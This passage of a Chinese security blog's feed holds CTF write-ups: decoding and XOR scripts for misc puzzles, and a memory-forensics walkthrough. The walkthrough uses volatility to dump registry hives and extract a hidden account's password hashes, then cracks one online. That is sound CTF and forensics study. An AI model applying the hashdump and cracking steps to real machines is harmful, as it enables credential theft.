class="built_in">hex</span>(asc)</span><br><span class="line">asc=asc[<span class="number">2</span>:]</span><br><span class="line"><span class="built_in">print</span>(binascii.a2b_hex(asc).decode())</span><br></pre></td></tr></table></figure><p>flag{duyoulikeit}</p><h2 id="relax"><a href="#relax" class="headerlink" title="relax"></a>relax</h2><p>打开是个.flag结尾的文件，丢进010editor看见是PK开头，考虑zip，解压出来一个flag.txt 一个音频。</p><p>flagtxt里面的base64解出来啥也不是，于是继续看音频。</p><p>考虑音频隐写，在文件详细信息里面发现了一串base64,解码后打开mp3stego，输入这个密码，得到了一串fakeflag：</p><p>fakeflag{same_length_with_true_flaghh}</p><p>和真的长的一样呢，真真假假</p><p>后面就没思路了。</p><p>后来看师傅的wp说需要讲该字符串与之前解出来啥也不是的base64异或就可以得到flag。草。</p><p>上脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span>  base64</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>) <span class="keyword">as</span>  f:</span><br><span class="line">    str1=f.readline()</span><br><span class="line">str1=base64.b64decode(str1)</span><br><span class="line">fakeflag=<span class="string">&quot;fakeflag&#123;same_length_with_true_flaghh&#125;&quot;</span>.encode()</span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="built_in">len</span>(fakeflag)):</span><br><span class="line">    tmp=fakeflag[i]^str1[i]</span><br><span class="line">    flag+=<span class="built_in">chr</span>(tmp)</span><br><span class="line"><span class="built_in">print</span>( flag)</span><br></pre></td></tr></table></figure><p>这里需要注意的是：encode()方法是str类型提供的，将其转换为byte类型。decode（）方法是将byte类型转化为str类型。之前我都是出错了就直接瞎encode，decode，咋对咋弄。。今天终于知道了。</p><p>flag：flag{9ff3a239027a7089237686b384862d33}</p><h2 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h2><p>base64套娃，光想着basecrack，结果直接卡死。。就是没想起来自己写脚本。</p><p>附上hxd的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span> (<span class="string">&quot;base.txt&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span>  f:</span><br><span class="line">    content=f.read()</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        content=base64.b16decode(content).decode()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;b16&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(content)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            content=base64.b32decode(content).decode()</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;b32&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(content)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                content=base64.b64decode(content).decode()</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;b64&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(content)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    content=base64.b85decode(content).decode()</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;b85&quot;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(content)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>flag:flag{4b057431c3ee0c4f56d4dad18c352375}</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;打聊城的比赛，又白给了，拿了参与奖，做出来两个misc，剩下两个misc都做了快一半，没思路了，特来复现。&lt;/p&gt;
&lt;h1 id=&quot;web&quot;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>取证专题</title>
    <link href="https://polosec.github.io/2020/11/17/%E5%8F%96%E8%AF%81%E4%B8%93%E9%A2%98/"/>
    <id>https://polosec.github.io/2020/11/17/%E5%8F%96%E8%AF%81%E4%B8%93%E9%A2%98/</id>
    <published>2020-11-17T03:49:09.000Z</published>
    <updated>2020-11-17T04:32:36.606Z</updated>
    
    <content type="html"><![CDATA[<p>取证需要用到的工具：</p><p>volatility、注册表分析工具（WRR）、AXIOM等。</p><h1 id="例题分析"><a href="#例题分析" class="headerlink" title="例题分析"></a>例题分析</h1><h2 id="湖湘杯misc"><a href="#湖湘杯misc" class="headerlink" title="湖湘杯misc"></a>湖湘杯misc</h2><p>首先看一下imageinfo</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 用户名注册表.vmem  imageinfo</span><br></pre></td></tr></table></figure><p>选择一个supported  profile，这里选第一个不行，所以选第二个Win2003SP2x86</p><p>先扫一下pslist</p><p>volatility -f 用户名注册表.vmem  –profile=Win2003SP2x86 pslist</p><p>除了winlogon.exe之外没啥收获，然后扫一下网络，也没啥收获。</p><p>后面尝试扫描connscan，cmdscan，notepad。</p><p>在扫notepad的时候发现了一些东西，于是尝试扫一下后缀为.txt的文件，看看有没有收获。</p><img src="http://cdn.polowong.top/static/images/hxbmisc1.jpg"><p>发现了一个file.txt，尝试dump到本地。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 用户名注册表.vmem  --profile&#x3D;Win2003SP2x86 dumpfiles -Q 0x000000000412cde0 -D .&#x2F;</span><br></pre></td></tr></table></figure><p>dump下来的文件内容为</p><p>什么？计算机又被不知名账户登录了？明明在计算机管理中没有这个用户，为什么还会被这个用户登录呢？电脑跟前的你能帮我找到原因吗？flag为该用户的用户名以及密码的md5值。</p><p>格式：md5(用户名:密码）</p><p>下面考虑在注册表中找一下隐藏用户。</p><p>首先看一下注册表。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 用户名注册表.vmem  --profile&#x3D;Win2003SP2x86 hivelist volatility -f 用户名注册表.vmem  --profile&#x3D;Win2003SP2x86 hivelist</span><br></pre></td></tr></table></figure><p>发现了SAM表。SAM表是存储了电脑登录用户相关信息的表，尝试dump出SAM表。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 用户名注册表.vmem  --profile&#x3D;Win2003SP2x86 dumpregistry -D .&#x2F;</span><br></pre></td></tr></table></figure><p>然后使用注册表分析工具打开。</p><img src="http://cdn.polowong.top/static/images/hxbmisc2.jpg"><p>可以看到很多隐藏账户，一个个看看是否有last logon 这个属性。</p><p>最后找到了用户 FHREhpe，然后再回到volatility里面hashdump 出来关于他的账号密码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 用户名注册表.vmem  --profile&#x3D;Win2003SP2x86 hashdump | grep FHREhpe</span><br><span class="line">有如下数据：</span><br><span class="line">FHREhpe$:1171:70fdb8f853bd427d7584248b8d2c9f9e:f3cf477fc3ea6ec0b3b5887616dd4506:::</span><br></pre></td></tr></table></figure><p>  <em>Windows</em>系统下的<em>hash</em>密码格式为：用户名称*:RID:LM-HASH<em>值</em>:NT-HASH*值 </p><p>获得NT HASH值后可以去md5网站解密，解密后的密码是NIAIWOMA</p><p>然后将其MD5加密后即可获得flag。</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://bbs.ichunqiu.com/thread-59102-1-1.html">https://bbs.ichunqiu.com/thread-59102-1-1.html</a></p><p><a href="https://www.sqlsec.com/2019/11/winhash.html">https://www.sqlsec.com/2019/11/winhash.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;取证需要用到的工具：&lt;/p&gt;
&lt;p&gt;volatility、注册表分析工具（WRR）、AXIOM等。&lt;/p&gt;
&lt;h1 id=&quot;例题分析&quot;&gt;&lt;a href=&quot;#例题分析&quot; class=&quot;headerlink&quot; title=&quot;例题分析&quot;&gt;&lt;/a&gt;例题分析&lt;/h1&gt;&lt;h2 id=&quot;</summary>
      
    
    
    
    
    <category term="取证" scheme="https://polosec.github.io/tags/%E5%8F%96%E8%AF%81/"/>
    
  </entry>
  
</feed>
